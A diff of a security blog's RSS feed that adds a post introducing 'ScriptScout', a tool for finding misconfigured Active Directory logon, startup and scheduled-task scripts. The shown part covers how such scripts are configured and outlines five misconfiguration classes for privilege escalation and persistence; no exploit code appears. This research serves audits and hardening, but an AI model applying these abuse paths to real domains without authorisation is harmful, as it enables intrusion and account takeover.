@@ -1,4 +1,714 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Marco Zufferli</title><link>https://marcozufferli.com/posts/</link><description>Recent content in Posts on Marco Zufferli</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener"&gt;CC BY-NC 4.0&lt;/a&gt;</copyright><lastBuildDate>Fri, 26 Sep 2025 14:56:19 +0200</lastBuildDate><atom:link href="https://marcozufferli.com/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Demystify Kerberos Delegation Attacks</title><link>https://marcozufferli.com/posts/demystify_kerberos_delegation_attacks/</link><pubDate>Fri, 26 Sep 2025 14:56:19 +0200</pubDate><guid>https://marcozufferli.com/posts/demystify_kerberos_delegation_attacks/</guid><description>Hands-on explanation of Kerberos delegation exploitation techniques and pragmatic detection and hardening advice for defenders.</description><content type="html"><![CDATA[<hr>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Marco Zufferli</title><link>https://marcozufferli.com/posts/</link><description>Recent content in Posts on Marco Zufferli</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener"&gt;CC BY-NC 4.0&lt;/a&gt;</copyright><lastBuildDate>Fri, 14 Nov 2025 00:05:40 +0100</lastBuildDate><atom:link href="https://marcozufferli.com/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Introducing ScriptScout: Transforming Smooth AD Automation Scripts into Attack Vectors</title><link>https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/</link><pubDate>Fri, 14 Nov 2025 00:05:40 +0100</pubDate><guid>https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/</guid><description>&lt;hr&gt;
+&lt;h4 id="table-of-contents"&gt;Table of Contents:&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#30"&gt;TL;DR&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#31"&gt;What&amp;rsquo;s an Active Directory Automation Script and How to Configure It&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1"&gt;Group Policy Script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2"&gt;Logon Script via ScriptPath&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3"&gt;GPO Scheduled Task&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#32"&gt;Abuse Misconfigurated AD Automation Script&lt;/a&gt;:
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#9"&gt;SMISC1&lt;/a&gt;: Plaintext Credentials Stored Inside Scripts.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#14"&gt;SMISC2&lt;/a&gt;: Find a Script that execute a remote file hosted on a SMB Share, where the file itself or its parent folder / SMB Share has excessive permissions (so the file inherits those permissions).&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#15"&gt;SMISC3&lt;/a&gt;: Find a Script that executes a non-existent remote file hosted on an SMB share, where its parent folder / SMB share has excessive permissions.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#33"&gt;SMISC4&lt;/a&gt;: The Script itself contained inside the SYSVOL / NETLOGON has excessive permission.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#26"&gt;SMISC5&lt;/a&gt;: Find a Script that map a SMB share &amp;amp; / OR execute a remote file hosted on a SMB Share, where the machine that expose that SMB Share does not exist anymore.
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#22"&gt;SMISC5 -&amp;gt; Deep Dive&lt;/a&gt; - An Exploitation Edge Case.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#34"&gt;ScriptScout Tips &amp;amp; Tricks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#35"&gt;Outro&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://marcozufferli.com/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#36"&gt;References&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="introducing-scriptscout-transforming-smooth-ad-automation-scripts-into-attack-vectors"&gt;&lt;strong&gt;Introducing ScriptScout: Transforming Smooth AD Automation Scripts into Attack Vectors&lt;/strong&gt;&lt;/h1&gt;
+&lt;img src="https://marcozufferli.com/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/foto1.jpg" class="center" style="border-radius: 8px;" /&gt;
+&lt;span id=30&gt;
+&lt;h2 id="tldr"&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;In an Active Directory scenario, it is possible to configure the automatic execution of a specific script following a particular event, these scripts are called &amp;ldquo;AD Automation Script&amp;rdquo; which &lt;em&gt;typically&lt;/em&gt; are: Logon Script, LogOff Script, StartUp Script and Shutdown Script; if they are configured incorrectly, an attacker, broadly speaking, is able to impersonate the user who executes such Automation Script and this allows the attacker to perform Privilege Escalation and / or Persistency.&lt;/p&gt;</description><content type="html"><![CDATA[<hr>
+<h4 id="table-of-contents">Table of Contents:</h4>
+<ul>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#30">TL;DR</a></li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#31">What&rsquo;s an Active Directory Automation Script and How to Configure It</a>
+<ul>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a></li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">Logon Script via ScriptPath</a></li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a></li>
+</ul>
+</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#32">Abuse Misconfigurated AD Automation Script</a>:
+<ul>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#9">SMISC1</a>: Plaintext Credentials Stored Inside Scripts.</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#14">SMISC2</a>: Find a Script that execute a remote file hosted on a SMB Share, where the file itself or its parent folder / SMB Share has excessive permissions (so the file inherits those permissions).</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#15">SMISC3</a>: Find a Script that executes a non-existent remote file hosted on an SMB share, where its parent folder / SMB share has excessive permissions.</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#33">SMISC4</a>: The Script itself contained inside the SYSVOL / NETLOGON has excessive permission.</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#26">SMISC5</a>: Find a Script that map a SMB share &amp; / OR execute a remote file hosted on a SMB Share, where the machine that expose that SMB Share does not exist anymore.
+<ul>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#22">SMISC5 -&gt; Deep Dive</a> - An Exploitation Edge Case.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#34">ScriptScout Tips &amp; Tricks</a></li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#35">Outro</a></li>
+<li><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#36">References</a></li>
+</ul>
+<hr>
+<h1 id="introducing-scriptscout-transforming-smooth-ad-automation-scripts-into-attack-vectors"><strong>Introducing ScriptScout: Transforming Smooth AD Automation Scripts into Attack Vectors</strong></h1>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/foto1.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<span id=30>
+<h2 id="tldr"><strong>TL;DR</strong></h2>
+<p>In an Active Directory scenario, it is possible to configure the automatic execution of a specific script following a particular event, these scripts are called &ldquo;AD Automation Script&rdquo; which <em>typically</em> are: Logon Script, LogOff Script, StartUp Script and Shutdown Script; if they are configured incorrectly, an attacker, broadly speaking, is able to impersonate the user who executes such Automation Script and this allows the attacker to perform Privilege Escalation and / or Persistency.</p>
+<p>A total of 5 misconfigurations have been identified and they have been sequentially classified with the term SMISC (Script MISCconfiguration), in order to identify these SMISC automatically i have developed a Python tool called &ldquo;ScriptScout&rdquo;.</p>
+<span id=31>
+<h2 id="what-is-an-active-directory-automation-script-and-how-to-configure-it"><strong>What is an Active Directory Automation Script and How to Configure It</strong></h2>
+<p>In an Active Directory scenario it is possible to configure the automatic triggering of a specific script following a specific event, these scripts are called “AD Automation Script” and they in an AD scenario can be configured either via GPOs or via the “ScriptPath” property of a “Users” object.</p>
+<p>Depending on the scenario of when the script execution occurs, the latter takes a different name:</p>
+<span id=6>
+<ul>
+<li><strong>Logon Script (User Logon)</strong>: A script executed automatically when a domain user authenticates on a domain-joined computer, specifically, that script will be executed by the computer itself impersonating the domain user who has just logged in.</li>
+</ul>
+<span id=19>
+<ul>
+<li><strong>Logoff Script (User Logoff)</strong>: A script executed automatically when a domain user logs off on a domain-joined computer, specifically, that script will be executed by the computer itself impersonating the domain user who has just logged off.</li>
+</ul>
+<span id=11>
+<ul>
+<li>
+<p><strong>Startup Script (Computer Startup)</strong>: A script executed automatically when a computer is started, specifically, that script will be executed locally by the user “NT Authority\System” (the corresponding Computer Account will be used if network interactions are required).</p>
+</li>
+<li>
+<p><strong>Shutdown Script (Computer Shutdown)</strong>: A script executed automatically when a computer is shut down, specifically, that script will be executed by the user “NT Authority\System” (the corresponding Computer Account will be used if network interactions are required).</p>
+</li>
+</ul>
+<span id=4>
+<blockquote>
+<p>I want to highlight that <strong>using &ldquo;GPO Scheduled Task” it is possible to execute specific scripts</strong> (also considered as “Automation Scripts”) <strong>even in other scenarios not listed above</strong> (for example they can be triggered on a “On Workstation Lock” event of the computer, or with a fixed recurrence in time and so on), <strong>in that case, the account that will execute the script depends on how the GPO Scheduled Task has been configured.</strong></p></blockquote>
+<p>Specifically, GPOs allow the configuration of <strong>ALL</strong> the types of “Automation Script” listed above and more, whereas the “ScriptPath” property of a “Users” object is only able to configure a “Logon Script (User Logon)”.</p>
+<p>Below i detail the 3 methodologies that Active Directory provides to configure an “Automation Script”, so: <strong>&quot;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a>&rdquo;</strong>, <strong>&quot;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">Logon Script via ScriptPath</a>&quot;</strong> and <strong>&quot;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>&quot;</strong>.</p>
+<span id=1>
+<h2 id="group-policy-script"><strong>Group Policy Script</strong></h2>
+<p>The automatic execution of specific scripts in certain scenarios is an extremely convenient feature for system administrators, especially when configured through GPOs, because they can centrally manage everything from the Group Policy Management Console; for example, they can configure the mapping of a specific File Share every time a domain user logs into a machine, or upon computer startup, perform the deletion of local temporary files, and so on.</p>
+<p>Specifically, in this article, a GPO that uses &ldquo;Policies -&gt; Windows Settings&rdquo; to configure a Logon, Logoff, Startup, or Shutdown script will be called a &ldquo;Group Policy Script&rdquo; and depending on the type of &ldquo;Automation Script&rdquo; being deployed, the corresponding &ldquo;Group Policy Script&rdquo; may be called a &ldquo;GPO Logon Script&rdquo;, &ldquo;GPO Startup Script&rdquo; and so on.</p>
+<blockquote>
+<p>The term “Group Policy Script” (and therefore names like &ldquo;GPO Logon Script&rdquo; and so on) is used to distinguish it from a &ldquo;GPO Scheduled Task&rdquo;, which can also be used to deploy an Automation Script.</p></blockquote>
+<p>In this section, we will focus on the creation of the GPO Logon Script, as this is one of the most commonly used scenarios in an AD context:</p>
+<ol>
+<li>
+<p><strong>Access the Group Policy Management Console, create a GPO, and link it to the relevant OU / Site / Domain</strong></p>
+<p>In this scenario, we will create a GPO that configures a specific Logon Script (so it will be a GPO that will exclusively affect domain users - User Objects) by associating it directly to the domain.</p>
+<p>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_1.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<br>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_2.png"  class="center"  style="border-radius: 8px;"  />
+    
+</p>
+<p>In other words, this GPO Logon Script will affect all domain users.</p>
+</li>
+<li>
+<p><strong>Then click &ldquo;edit&rdquo; and double-click on &ldquo;User Configuration&rdquo; -&gt; &ldquo;Policies&rdquo; -&gt; &ldquo;Windows Settings&rdquo; -&gt; &ldquo;Script (Logon / Logoff)&rdquo; -&gt; &ldquo;Logon&rdquo;</strong></p>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_3.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+</ol>
+<blockquote>
+<p>Instead, if we were to go to &ldquo;Computer Configuration&rdquo; -&gt; &ldquo;Policies&rdquo; -&gt; &ldquo;Windows Settings&rdquo; -&gt; &ldquo;Script (Startup / Shutdown),&rdquo; we could respectively configure either a Startup or Shutdown Script; in that way, when any machine joined to the domain performed those actions, the corresponding script would be executed; in our example, however, we are configuring a Logon Script.</p></blockquote>
+<ol start="3">
+<li>
+<p><strong>Click &ldquo;Properties&rdquo; on &ldquo;Logon&rdquo; and configure the Logon Script</strong></p>
+<p>A window will appear where it will be possible to enter the logon script:</p>
+</li>
+</ol>
+<ul>
+<li>The &ldquo;Script&rdquo; section allows you to enter files with the extensions &ldquo;.bat&rdquo;, &ldquo;.cmd,&rdquo; &ldquo;.vbs&rdquo; (VBScript), and &ldquo;.js&rdquo; (JScript).</li>
+</ul>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_4.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<ul>
+<li>The &ldquo;PowerShell Scripts&rdquo; section allows you to enter a file with the &ldquo;.ps1&rdquo; extension.</li>
+</ul>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_5.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>In our case, we are going to configure the following PowerShell Script &ldquo;logon_script.ps1&rdquo;</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_6.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>In order to do this, click &ldquo;Show Files&rdquo; from &ldquo;PowerShell Script&rdquo; section which will automatically open the folder pointing to the SYSVOL path containing the newly created GPO, specifically it will point to the location where we must insert our script, so now we can do a copy of the &ldquo;logon_script.ps1&rdquo; file and paste it into that location.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_7.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+  <br>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_8.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Now click &ldquo;Add&rdquo;, &ldquo;Browse&rdquo;, then the previously mentioned SYSVOL path will open and you will need to select the &ldquo;logon_script.ps1&rdquo; script.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_9.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Then do &ldquo;Apply&rdquo; and &ldquo;Ok&rdquo;.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_10.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Now you have created a &ldquo;GPO Logon Script&rdquo;.</p>
+<p>As for any other GPOs, several hours will be required to propagate this GPO throughout the whole domain, for this reason, since we are within our laboratory we will force this update for example on the machine THEPUNISHER.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_11.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Once this is done, everything has been completed.</p>
+<p>In this scenario, since a &ldquo;GPO Logon Script&rdquo; (so only domain users will be affected) has been directly associated with the domain, when any domain user logs into any computer, the relative computer will execute the Logon Script by impersonating the user who has just logged in, so in this case the machine will perform a ping to the DC; as shown in the following screenshot when a user logs into the THEPUNISHER machine (192.168.52.132) 10 &ldquo;ICMP Echo Request&rdquo; will be executed toward the attacking machine (192.168.52.129).</p>
+<blockquote>
+<p>If the script does not include spawning elements visible in the GUI, the script will run entirely in the background and therefore be invisible to the user, exactly as in this case.</p></blockquote>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_12.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+  <br>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_13.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>Since a &ldquo;GPO Logon Script&rdquo; affects only domain users, if this &ldquo;GPO Logon Script&rdquo; is associated with an OU, all user objects (do all domain user) contained within it will be affected by the GPO; consequently, if the OU does not contain any domain users, that &ldquo;GPO Logon Script&rdquo; will have no effect.</p>
+<p>Furthermore i want to highlight that this behavior occurs every time the impacted domain users log in to any computer (obviously, the domain user must have permission to perform the login), and this also means that it is not necessary to include &ldquo;Computer&rdquo; objects within the relevant OU to make the &ldquo;GPO Logon Script&rdquo; effective.</p></blockquote>
+<span id=2>
+<h2 id="logonscript-via-scriptpath-property"><strong>LogonScript via ScriptPath Property</strong></h2>
+<p>In an Active Directory context a Logon Scripts can also be configured using the &ldquo;<a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath">scriptPath</a>&rdquo; property that each &ldquo;User&rdquo; object (domain user) possesses.</p>
+<p>When Active Directory was first introduced and early Windows OS were still common (such as Windows 95, 98, and NT), Group Policy did not yet exist and so the scriptPath property was created, <a href="https://web.archive.org/web/20250826232819/https://www.rlmueller.net/LogonScriptFAQ.htm">this property allow administrators to assign a specific Logon Script to a domain user</a>; this legacy feature is still supported today for backward compatibility and remains a commonly used method for configuring Logon Scripts.</p>
+<blockquote>
+<p>If a Logon Script is configured via scriptPath on a user and another Logon Script is configured via &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO Logon Script</a>&rdquo; for the same user, then on Windows machines newer than Windows 2000, both Logon Scripts will run automatically when that user logs in.</p></blockquote>
+<p>So let&rsquo;s make an example:
+<br><br></p>
+<ol>
+<li>
+<p><strong>Insert the Logon Script inside the SYSVOL</strong></p>
+<p>Insert the script that must be executed during &ldquo;Logon&rdquo; inside the folder &ldquo;<code>\\&lt;DC-hostname&gt;\SYSVOL\&lt;domain&gt;\script\</code>&rdquo; of the Domain Controller, in our scenario, the file &ldquo;logonscript_scriptPath.bat&rdquo; which maps a network share has been correctly inserted in this location.</p>
+<blockquote>
+<p>The supported extensions are &ldquo;.bat&rdquo;, &ldquo;.cmd&rdquo; and &ldquo;.vbs&rdquo; (from my tests, &ldquo;.ps1&rdquo; is not allowed).</p></blockquote>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_1.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<p>By default the Domain Controller will also expose the folder &ldquo;<code>\\&lt;DC-hostname&gt;\NETLOGON</code>&rdquo; which is simply an alias of the folder &ldquo;<code>\\&lt;DC-hostname&gt;\SYSVOL&lt;domain&gt;\script</code>&rdquo;, in fact, by browsing it you will immediately find the file you just uploaded.</p>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_2.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+<li>
+<p><strong>Configure the Logon Script for a specific domain user.</strong></p>
+<p>Using the <a href="https://www.varonis.com/blog/active-directory-users-and-computers">ADUC</a> go to the desired &ldquo;User&rdquo; object (so the domain user) and inspect the &ldquo;Profile&rdquo; tab, then, in the &ldquo;Logon Script&rdquo; section enter only the name of the file previously uploaded on the SYSVOL.</p>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_3.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<p>With these configurations, by default, the script &ldquo;logonscript_scriptPath.bat&rdquo; will be searched inside the &ldquo;<code>\\&lt;DC-hostname&gt;\NETLOGON</code>&rdquo; which by design it&rsquo;s able to contain all &ldquo;Logon Scripts&rdquo; executed with this functionality.</p>
+<p>Specifically, setting this configuration the DC will automatically modify the &ldquo;scriptPath&rdquo; property of the corresponding &ldquo;Users&rdquo; object.</p>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_4.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+</ol>
+<p>Now, every time the domain user &ldquo;MARVEL\pparker&rdquo; logs in on any domain joined machine, the machine where the user logs in will retrieve the Logon Script &ldquo;logonscript_scriptPath.bat&rdquo; located at <code>\\&lt;DC-hostname&gt;\\NETLOGON\\</code>
+(which is accessible by anyone just like SYSVOL) and execute it by impersonating the user who has just logged in, in this case, the user &ldquo;MARVEL\pparker&rdquo;.</p>
+<p>In our specific case, as soon as the user MARVEL\pparker authenticates on the SPIDERMAN computer (any computer where this domain user &ldquo;MARVEL\pparker&rdquo; could log in would work), the network share &ldquo;business_folder&rdquo; hosted on the machine THEPUNISHER will be automatically mapped.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_5.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<span id=3>
+<h2 id="gpo-scheduled-task"><strong>GPO Scheduled Task</strong></h2>
+<p>It is possible to use a GPO to associate domain joined computers or domain users with a “Scheduled Task,” which, by its nature, will automatically execute a Task (an action) under a specific scenario; in this context, this type of GPO is called a “GPO Scheduled Task”.</p>
+<p>Since &ldquo;GPO Scheduled Tasks&rdquo; are extremely flexible, when properly configured they can also automatically execute an &ldquo;Automation Script&rdquo; after a specific trigger, in a manner similar to the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a> described earlier but with even greater flexibility (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#4">because you are not limited anymore to the standard scenario</a>)</p>
+<p>To configure a &ldquo;GPO Scheduled Task&rdquo;, as with any other GPO, open the &ldquo;Group Policy Management Console,&rdquo; create a new GPO, link it to the domain or desired OU, then go to &ldquo;Edit&rdquo; -&gt; &ldquo;Computer Configuration or User Configuration&rdquo; -&gt; &ldquo;Preferences&rdquo; and finally &ldquo;Scheduled Task.&rdquo;</p>
+<p>In this scenario, a GPO named &ldquo;GPO_ComputerScheduledTask&rdquo; is configured and associated with the entire domain and it sets up a Scheduled Task called &ldquo;ComputerScheduledTask&rdquo; for computers objects, so let’s analyze how it has been set up to understand its behaviour &amp; eventually how to create a new one.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_1.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>The configuration for a &ldquo;GPO Scheduled Task&rdquo; associated with computers is extremely similar to one for domain users.</p>
+<p>Because &ldquo;GPO Scheduled Tasks&rdquo; are highly flexible, their behavior is generally analogous whether linked to computers or domain user with only minor differences, for this reason, in order to avoid repetitive explanations, details about &ldquo;GPO Scheduled Tasks&rdquo; linked to domain users will not be covered.</p></blockquote>
+<p>In our scenario, this Scheduled Task called &ldquo;ComputerScheduledTask&rdquo; will be executed with the local permissions of &ldquo;NT Authority\System&rdquo;.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_2.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Specifically, it will be executed when an &ldquo;On Workstation Lock&rdquo; event occurs by any user, in other words, whenever any user locks the computer (affected by the &ldquo;GPO Scheduled Task&rdquo;), this Scheduled Task will be triggered.</p>
+<blockquote>
+<p>e.g. the &ldquo;On Workstation Lock&rdquo; event is not something that it&rsquo;s possible to setup using the &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a>&rdquo;</p></blockquote>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_3.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Once triggered, this &ldquo;Scheduled Task&rdquo; will execute a specific action, in this case, it will launch a program, specifically, it has been configured to execute &ldquo;powershell.exe&rdquo; running the file &ldquo;misc4_logonscript_2.ps1&rdquo; located in SYSVOL</p>
+<blockquote>
+<p>The practice of executing scripts placed inside the SYSVOL is very common, since the files inside it are accessible from any domain joined machine making them well suited for such scenarios.</p></blockquote>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_4.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>This script will perform an HTTP request and perform a ping.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_5.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>As a practical demonstration, for example if any user performs the &ldquo;On Workstation Lock&rdquo; event on the SPIDERMAN joined machine, the latter will execute (impersonating the &ldquo;NT Authority\SYSTEM&rdquo; user) the Scheduled Task &ldquo;ComputerScheduledTask&rdquo; which will run with PowerShell the file &ldquo;misc4_logonscript_2.ps1&rdquo; located on SYSVOL.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_6.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>Finally, i want to highlight that when a &ldquo;GPO Scheduled Task&rdquo; is configured, inside the following path on SYSVOL: <code>\\&lt;dc_hostname&gt;\SYSVOL\Policies\&lt;GUID&gt;\&lt;Machine OR Users&gt;\Preferences\ScheduledTasks\</code> there will be a file named &ldquo;Scheduled.Tasks.xml&rdquo; which will detail the operation of the corresponding &ldquo;Scheduled Task&rdquo;, in this case, in fact, it&rsquo;s possible to observe that the script named &ldquo;misc4_logonscript_2.ps1&rdquo; will be executed with the SYSTEM user:</p>
+<br>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_7.png"  class="center"  style="border-radius: 8px;"  />
+
+</blockquote>
+<span id=32>
+<h2 id="abuse-misconfigurated-ad-automation-script"><strong>Abuse Misconfigurated AD Automation Script</strong></h2>
+<p>These &ldquo;Automation Scripts&rdquo; are generally used to map file shares, add printers, update software, delete temporary files, log the timestamp of a successful login, execute specific commands, configure the desktop background and so on; therefore they prove to be very powerful and flexible and consequently, if misconfigured, they become potential attack vectors for an attacker, this section focuses on the main misconfigurations that occur in an &ldquo;Automation Script&rdquo; that maps a network share (SMB) or executes a remote file hosted always on a network share (SMB).</p>
